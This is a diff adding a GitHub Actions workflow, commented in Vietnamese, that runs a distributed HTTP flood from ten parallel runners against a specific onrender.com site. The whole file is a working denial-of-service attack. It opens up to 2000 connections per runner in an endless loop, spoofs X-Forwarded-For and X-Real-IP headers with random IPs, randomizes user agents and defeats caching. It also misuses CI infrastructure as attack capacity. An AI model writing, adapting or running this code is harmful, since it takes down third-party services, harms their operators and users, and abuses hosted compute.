@@ -1,0 +1,45 @@
+name: Global_Exploit_Render
+on:
+  workflow_dispatch: # Bấm nút để chạy thủ công
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # Chạy 10 máy ảo song song
+    steps:
+      - name: Install HTTPX
+        run: pip install httpx nest_asyncio
+
+      - name: Execute Exploit
+        run: |
+          python -c "
+          import asyncio, httpx, random, nest_asyncio
+          nest_asyncio.apply()
+          
+          URL = 'https://sangdev.onrender.com/'
+          FILES = ['assets/css/style.css', 'assets/js/main.js', 'admin_login', 'config.php']
+
+          async def attack():
+              # Tối ưu kết nối lên mức cao nhất của server GitHub
+              limits = httpx.Limits(max_connections=2000, max_keepalive_connections=1000)
+              async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
+                  while True:
+                      fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
+                      headers = {
+                          'X-Forwarded-For': fake_ip,
+                          'X-Real-IP': fake_ip,
+                          'User-Agent': f'Mozilla/5.0 (Bot-{random.random()})',
+                          'Cache-Control': 'no-cache'
+                      }
+                      target = URL + random.choice(FILES)
+                      try:
+                          # Gửi yêu cầu cực nhanh, không đợi phản hồi lâu (0.5s)
+                          await client.get(target, headers=headers, timeout=0.5)
+                      except:
+                          pass
+          
+          print('🔥 Node ${{ matrix.node }} đang tổng tấn công...')
+          asyncio.run(attack())
+          "
